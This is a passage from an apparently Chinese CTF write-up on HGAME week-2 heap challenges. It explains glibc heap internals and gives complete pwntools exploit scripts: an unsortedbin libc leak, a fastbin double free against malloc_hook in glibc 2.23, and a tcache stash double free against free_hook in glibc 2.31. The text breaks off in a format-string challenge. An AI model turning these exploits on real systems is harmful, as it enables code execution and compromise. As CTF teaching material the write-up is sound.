class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">31198</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = main_arena - <span class="number">88</span> - <span class="number">0x3C4B20</span></span><br></pre></td></tr></table></figure>

<p><em>应该是很好理解 fastbin的范围只有0x20~0x80 那么我们释放一个0x80大小的chunk就会被放入unsortedbin 这时候其fd和bk域就会指向main_arena_addr 而delete函数没有对这个chunk的指针置零  导致这个我们仍然可以使用这个指针对chunk进行操作</em></p>
<p><em>还有一点就是libc基址的计算办法 88这个gdb动调可以很明显的看出来 那这个0x3c4b20呢 以往我们用的是gdb动调看libc基址和当此程序运行时泄露的main_arean的偏移 但是有的时候题目远程靶机和本地的libc版本不一样 这个时候如果你不会用patchelf修改libc的话 可以通过ida打开题目所对应的libc文件</em></p>
<p><em>寻找malloc_trim函数</em> </p>
<p><em><img src="https://pic.imgdb.cn/item/63c4e7cfbe43e0d30e6b7793.png"></em></p>
<p><em>对应的这个dword_1ecb80的偏移就是main_arean相较于libc基址的偏移</em></p>
<p><em>接下来的任务是想办法获取shell 2.23的题目直接打malloc_hook就好了 如果没有开启FULL RELRO 的话还可以通过覆写got表来实现shell</em></p>
<p><em>这里我们采用打got表 用的是double free的办法</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">one_gadget = libc_addr + <span class="number">0xf03a4</span></span><br><span class="line">payload = cyclic(<span class="number">0x13</span>)+p64(one_gadget)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,payload)</span><br></pre></td></tr></table></figure>

<p><em>但是不管我们如果更换one_gadget的偏移 就是打不通 哪怕gdb动调已经可以看到malloc_hook已经被写入one_gadget了</em></p>
<p><em>这是因为one_gadget的调用条件不满足</em></p>
<p><em>那么常规的利用malloc函数触发malloc_hook肯定是不行的了 询问了其他师傅才知道 double free也能触发malloc_hook 为此也是十分好奇 去翻了翻double free的源码</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">	   add (i.e., double free).  */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">	p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">	*fb = p;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p><em>当glibc检测到double free行为发生后 会调用malloc_printerr用来打印错误日志 但是基于本人水平也就只能朔源到这里了 以下均是猜想</em></p>
<p><em>因为malloc_printerr是在malloc.c中定义的 所以调用malloc_printerr就会和malloc函数一样先对malloc_hook的内容进行if判断 如果不为0则执行</em></p>
<p><em>完整exp:</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">31198</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = main_arena - <span class="number">88</span> - <span class="number">0x3C4B20</span></span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">one_gadget = libc_addr + <span class="number">0xf03a4</span></span><br><span class="line">payload = cyclic(<span class="number">0x13</span>)+p64(one_gadget)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="new-fast-note"><a href="#new-fast-note" class="headerlink" title="new_fast_note"></a><em>new_fast_note</em></h3><p><em>这题的主体结构和上题一致 不过版本从2.23到了2.31 这给我们的unsortedbin泄露机制和double free都制造了困难</em></p>
<p><em>由于多出了tcachebin 所以我们想要让一个chunk进入unsortedbin 要么就申请超出tcachebin范围 即0x400以上大小的chunk</em></p>
<p><em>或者填满tcachebin的一个链表 然后再次释放 如果超出fastbin的范围就会被放入unsortedbin 这里采取第二种办法</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">32435</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = main_arena-<span class="number">96</span>-<span class="number">0x1ECB80</span></span><br></pre></td></tr></table></figure>

<p><em>接下来我们的思路要放在如何篡改free_hook来获取shell</em></p>
<p><em>没有edit函数的情况下 又有UAF 我们很容易想到的是利用double free来做到任意地址写</em></p>
<p><em>但是2.31的版本 glibc对于double free的检查机制更加严格了</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span>  <span class="comment">//链表指针，对应chunk中的fd字段</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>  <span class="comment">//指向所属的tcache结构体，对应chunk中的bk字段</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p><em>对于每一个tcache都有一个key指针指向</em></p>
<p><em>借助这个key指针 plmalloc可以更好的对double free进行检查</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> tc_idx = csize2tidx(size);<span class="comment">//只要tcache不为空 并且free chunk在tcache范围中 都需要进行double free检查</span></span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">      tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        如果是这个chunk已经被放入tcache 那么key字段就已经有数据了 会被识别出来</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="comment">//汇报错误信息</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_entry *tmp;</span><br><span class="line">        LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">        <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)</span><br><span class="line">          <span class="keyword">if</span> (tmp == e)</span><br><span class="line">            malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">//通过检查，放入tcahce中</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put(p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><em>所以 如果我们还想要使用tcache double free的话 就只能修改key字段 或者是fastbin double free</em></p>
<p><em>但是由于fastbin对于chunk的取出有着size域的检查 相对来说不好办 但是在2.27.9版本以后 tcache新增了stash机制</em></p>
<p><em>要想明白这个机制的用处 我们先要清楚tcachebin的设计目的是什么</em></p>
<p><em>在多线程的情况下 plmalloc会遇到主分配区被抢占的问题 只能等待或者是申请一个非主分配区</em></p>
<p><em>针对这种情况 plmalloc为每个线程都涉及一个缓冲区 即tcache</em></p>
<p><em>而stash机制就是 如果用户申请一个0x60大小的chunk tcache里面没有的话 就会进入分配区处理</em></p>
<p><em>如果在fastbin中找到可以被申请的0x60chunk 系统就会认为将来还需要0x60大小的chunk 就会将fastbin中相同大小的chunk全部放入tcachebin中</em></p>
<p><em>因此我们利用这个手法就可以实现 在fastbin中实现double free 而在tcache中进行任意地址chunk的申请</em></p>
<p><em>完整exp:</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">32435</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)   //chunk0-chunk6用来填满tcache chunk7用来泄露基址</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)  //填满tcache 从而使chunk8和chunk9可以被放入fastbin 之所以index和前面的垃圾chunk一样 是因为</span><br><span class="line">                         //程序对于delete函数进行了限制 只能释放index&lt;=<span class="number">0xf</span>的chunk</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">11</span>):</span><br><span class="line">    add(i,<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = main_arena-<span class="number">96</span>-<span class="number">0x1ECB80</span></span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)          //将原本的tcache <span class="number">0x40</span>的链表全部的chunk申请 使其为空 触发stash机制</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">one_gadget = libc_addr + <span class="number">0xe3b01</span></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x30</span>,p64(system_addr))</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a><em>YukkuriSay</em></h3><p><em>非栈上格式化字符串漏洞题</em></p>
<p><em>checksec 查看一下保护机制发现还有canary机制</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3ff000)</span><br><span class="line">    RUNPATH:  &#x27;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/&#x27;</span><br></pre></td></tr></table></figure>

<p><em>由于本人没有安装libc2.31以上版本的ubuntu 所以本地和远程的环境不一样</em></p>
<p><em>这里采用xclibc脚本更换二进制文件所依赖的libc</em></p>
<p><em><a target="_blank" rel="noopener" href="https://github.com/ef4tless/xclibc">GitHub - ef4tless&#x2F;xclibc: A tool to change the libc environment of running files(一个在CTF比赛中用于切换题目运行libc环境的工具)</a></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xclibc -x pwn libc-2.31.so</span><br></pre></td></tr></table></figure>

<p><em>再来看一下ida反编译出来的伪代码</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">4</span>]; <span class="comment">// [rsp+Ch] [rbp-114h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span 